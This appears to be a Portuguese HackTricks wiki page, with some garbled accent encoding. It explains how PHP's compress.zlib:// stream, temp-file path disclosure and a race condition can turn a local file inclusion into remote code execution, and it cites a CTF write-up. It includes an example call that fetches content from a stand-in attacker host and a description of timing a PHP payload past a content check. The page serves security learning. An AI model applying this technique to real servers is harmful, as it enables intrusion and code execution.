# LFI2RCE Via compress.zlib + PHP\_STREAM\_PREFER\_STUDIO + Path Disclosure

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

### `compress.zlib://` e `PHP_STREAM_PREFER_STDIO`

Um arquivo aberto usando o protocolo `compress.zlib://` com a flag `PHP_STREAM_PREFER_STDIO` pode continuar escrevendo dados que chegam √† conex√£o posteriormente para o mesmo arquivo.

Isso significa que uma chamada como:
```php
file_get_contents("compress.zlib://http://attacker.com/file")
```
Farei uma solicita√ß√£o pedindo http://attacker.com/file, ent√£o o servidor pode responder √† solicita√ß√£o com uma resposta HTTP v√°lida, manter a conex√£o aberta e enviar dados extras algum tempo depois que tamb√©m ser√£o gravados no arquivo.

Voc√™ pode ver essa informa√ß√£o nesta parte do c√≥digo php-src em main/streams/cast.c:
```c
/* Use a tmpfile and copy the old streams contents into it */

if (flags & PHP_STREAM_PREFER_STDIO) {
*newstream = php_stream_fopen_tmpfile();
} else {
*newstream = php_stream_temp_new();
}
```
### Condi√ß√£o de Corrida para RCE

[**Este CTF**](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer) foi resolvido usando o truque anterior.

O atacante far√° com que o **servidor v√≠tima abra uma conex√£o lendo um arquivo do servidor do atacante** usando o protocolo **`compress.zlib`**.

**Enquanto** essa **conex√£o** existir, o atacante ir√° **exfiltrar o caminho** para o arquivo tempor√°rio criado (ele √© vazado pelo servidor).

**Enquanto** a **conex√£o** ainda estiver aberta, o atacante ir√° **explorar um LFI carregando o arquivo tempor√°rio** que ele controla.

No entanto, h√° uma verifica√ß√£o no servidor web que **impede o carregamento de arquivos que cont√™m `<?`**. Portanto, o atacante ir√° abusar de uma **Condi√ß√£o de Corrida**. Na conex√£o que ainda est√° aberta, o **atacante** ir√° **enviar o payload PHP DEPOIS** que o **servidor web** **verificou** se o arquivo cont√©m os caracteres proibidos, mas **ANTES de carregar seu conte√∫do**.

Para mais informa√ß√µes, consulte a descri√ß√£o da Condi√ß√£o de Corrida e o CTF em [https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf\_writeup/20191228-hxp36c3ctf/#includer)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
